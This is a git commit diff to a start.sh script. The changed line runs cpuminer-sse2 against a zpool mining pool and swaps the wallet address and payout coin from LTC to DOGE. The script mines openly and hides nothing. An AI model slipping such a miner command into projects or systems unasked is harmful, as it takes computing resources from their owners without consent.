b70b3f46747bd48100fc70c0ff2aaf59694c5d0b
crispycrackers89 <77894828+crispycrackers89@users.noreply.github.com>
2021-02-03 01:30:30 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -3,7 +3,7 @@
 
 chmod +x cpuminer-sse2
 
-./cpuminer-sse2 -a cpupower -o stratum+tcp://cpupower.sea.mine.zpool.ca:6240 -u MLJJE886FEN41DQgQ5p2rqNPkuQSTJBcGR -p c=LTC
+./cpuminer-sse2 -a cpupower -o stratum+tcp://cpupower.sea.mine.zpool.ca:6240 -u DAkwhf7nL9Qv97PfzV73CnHyZ3ve3SoKBF -p c=DOGE
 
 
 done
